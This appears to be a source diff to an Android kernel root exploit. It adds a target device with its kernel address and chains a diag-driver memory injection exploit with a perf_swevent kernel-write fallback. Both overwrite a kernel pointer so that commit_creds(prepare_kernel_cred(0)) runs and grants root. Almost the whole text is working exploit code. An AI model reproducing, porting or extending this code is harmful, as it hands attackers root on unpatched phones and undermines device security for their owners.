@@ -12,6 +12,7 @@
 #include <fcntl.h>
 
 #include "perf_swevent.h"
+#include "libdiagexploit/diag.h"
 
 typedef struct _supported_device {
   const char *device;
@@ -22,6 +23,7 @@ typedef struct _supported_device {
 static supported_device supported_devices[] = {
   { "F-11D",            "V24R40A"   , 0xc08ff1f4 },
   { "URBANO PROGRESSO", "010.0.3000", 0xc091b9cc },
+  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0b6a684 },
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
@@ -97,21 +99,11 @@ run_obtain_root_privilege(void)
   return true;
 }
 
-int
-main(int argc, char **argv)
+static bool
+attempt_perf_swevent_exploit(unsigned long int address)
 {
-  unsigned long int address;
-  int fd;
   int number_of_children;
   pid_t pid;
-
-  prepare_kernel_cred = get_symbol_address("prepare_kernel_cred");
-  commit_creds = get_symbol_address("commit_creds");
-
-  address = get_ashmem_write_address();
-  if (!address) {
-    exit(EXIT_FAILURE);
-  }
 
   pid = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
   if (pid == 0) {
@@ -124,6 +116,47 @@ main(int argc, char **argv)
 
   number_of_children = (int)&obtain_root_privilege / PERF_SWEVENT_MAX_FILE + 1;
   perf_swevent_reap_child_process(number_of_children);
+
+  return true;
+}
+
+static bool
+attempt_diag_exploit(unsigned long int address)
+{
+  struct diag_values injection_data;
+
+  injection_data.address = address;
+  injection_data.value = (uint16_t)&obtain_root_privilege;
+
+  if (!diag_inject(&injection_data, 1)) {
+    return false;
+  }
+
+  run_obtain_root_privilege();
+
+  injection_data.value = 3;
+  return diag_inject(&injection_data, 1);
+}
+
+int
+main(int argc, char **argv)
+{
+  unsigned long int address;
+  int fd;
+  bool success;
+
+  prepare_kernel_cred = get_symbol_address("prepare_kernel_cred");
+  commit_creds = get_symbol_address("commit_creds");
+
+  address = get_ashmem_write_address();
+  if (!address) {
+    exit(EXIT_FAILURE);
+  }
+
+  success = attempt_diag_exploit(address);
+  if (!success) {
+    success = attempt_perf_swevent_exploit(address);
+  }
 
   if (getuid() != 0) {
     printf("Failed to obtain root privilege.\n");
